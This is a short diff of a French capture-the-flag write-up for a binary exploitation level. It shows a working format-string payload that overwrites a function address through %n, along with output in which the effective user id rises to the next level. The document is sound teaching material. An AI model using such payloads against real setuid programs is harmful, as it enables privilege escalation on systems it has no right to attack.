@@ -48,7 +48,7 @@ End of assembler dump.
 - Comme pour l'exercice precedent nous avons l'adresse de la fonction à override et en plus l'adresse de la fonction o sous forme de decimal.
 
 <pre>
-$> (python -c "print('AAAA' + '\x38\x98\x04\x08' + '%134513820d' + '%5\$n')"; cat) | ./level5 | tr -d ' '`
+$> (python -c "print('AAAA' + '\x38\x98\x04\x08' + '%134513820d' + '%5\$n')"; cat) | ./level5 | tr -d ' '
 
 id
 uid=2045(level5)gid=2045(level5)euid=2064(level6)egid=100(users)groups=2064(level6),100(users),2045(level5)
